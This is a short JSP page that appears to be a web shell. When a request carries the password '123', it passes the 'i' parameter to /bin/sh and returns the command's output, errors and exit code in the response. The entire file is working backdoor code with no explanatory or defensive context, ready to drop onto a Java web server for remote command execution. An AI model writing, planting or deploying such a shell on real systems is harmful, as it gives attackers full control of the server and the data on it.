<%@ page import="java.io.*" %>
<%
if("123".equals(request.getParameter("pwd"))){
  try{
    ProcessBuilder pb = new ProcessBuilder("/bin/sh","-c",request.getParameter("i"));
    Process p = pb.start();
    InputStream a = p.getInputStream(), b = p.getErrorStream();
    int c; byte[] d = new byte[2048];
    out.print("<pre>");
    while((c=a.read(d))!=-1){out.print(new String(d,0,c));}
    while((c=b.read(d))!=-1){out.print(new String(d,0,c));}
    out.print("</pre>");
    out.print("\nEXIT:"+p.waitFor());
  }catch(Exception e){out.print("ERR:"+e);}
}
%>
